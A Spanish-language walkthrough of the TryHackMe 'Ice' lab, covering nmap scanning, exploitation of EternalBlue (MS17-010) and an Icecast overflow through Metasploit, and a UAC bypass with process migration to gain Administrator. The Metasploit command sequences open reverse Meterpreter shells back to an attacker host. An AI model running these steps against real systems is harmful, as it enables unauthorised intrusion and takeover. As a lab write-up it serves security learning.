---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#RDP|RDP]]
- [[#Explotación|Explotación]]
	- [[#Explotación#RDP - EternalBlue|RDP - EternalBlue]]
	- [[#Explotación#Icecast|Icecast]]
		- [[#Icecast#Escalada de Privilegios|Escalada de Privilegios]]

---
# Ice

![](Screenshots/829892f5e7936a448f465b64d64f9c62.png)

> En este write-up se documenta la resolución paso a paso de la máquina **Ice** de [TryHackMe](https://tryhackme.com/room/ice), clasificada como dificultad **Easy**. Se cubren las fases de **enumeración**, **explotación** y **escalada de privilegios**.

---
## Enumeración
### Ping

`ping -c 1 10.81.185.3`

![](Screenshots/Pasted%20image%2020251209090119.png)


### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.81.185.3 -oG allPorts`

![](Screenshots/Pasted%20image%2020251209090319.png)

`nmap -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 -sCV 10.81.185.3 -oN targeted`

![](Screenshots/Pasted%20image%2020251209090441.png)
### RDP

Se comprueba con *Nmap*, si el puerto `445` es vulnerable *EternalBlue*.

`nmap --script "vuln" -p445 10.81.185.3`

![](Screenshots/Pasted%20image%2020251209091822.png)

---
## Explotación
### RDP - EternalBlue

```bash
msfconsole
search ms17
use 0 | use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST [IP_MAQUINA_VICTIMA]
set LHOST [IP_MAQUINA_ATACANTE]
exploit
```

Se obtiene una *Meterpreter Session*, se lista información del sistema.

`pwd`

![](Screenshots/Pasted%20image%2020251209092302.png)

`sysinfo`

![](Screenshots/Pasted%20image%2020251209092342.png)

```bash
shell
whoami
```

![](Screenshots/Pasted%20image%2020251209092417.png)

Se obtienen permisos de **Administrador**.
### Icecast

```bash
msfconsole
search Icecast
use 0 | exploit/windows/http/icecast_header
show options
set RHOST [IP_MAQUINA_VICTIMA]
set LHOST [IP_MAQUINA_ATACANTE]
exploit
```

Se obtiene una *Meterpreter Session*, se lista información del sistema.

`pwd`

![](Screenshots/Pasted%20image%2020251209094213.png)

`sysinfo`

![](Screenshots/Pasted%20image%2020251209094238.png)

```bash
shell
whoami
```

![](Screenshots/Pasted%20image%2020251209094301.png)

```bash
exit
background
```
#### Escalada de Privilegios

```bash
search search local_exploit_suggester
use 0 | use post/multi/recon/local_exploit_suggester
show options
sessions
set SESSION [NUMERO_SESION]
exploit
```

![](Screenshots/Pasted%20image%2020251209095716.png)

Es un módulo de elevación de privilegios de Metasploit que intenta omitir el Control de Cuentas de Usuario (UAC) en Windows sin necesidad de credenciales adicionales. Para luego poder migrar a un proceso que tenga privilegios de administrador.

```bash
use exploit/windows/local/bypassuac_eventvwr
show options
sessions
set SESSION [NUMERO_SESION]
set LHOST [IP_MAQUINA_ATACANTE]
set LPORT 4445
exploit
```

Se obtiene una *Meterpreter Session*, se lista información del sistema.

`ps`

![](Screenshots/Pasted%20image%2020251209095955.png)

```bash
migrate 100
shell
whoami
```

![](Screenshots/Pasted%20image%2020251209092417.png)

Se obtienen permisos de **Administrador**.

---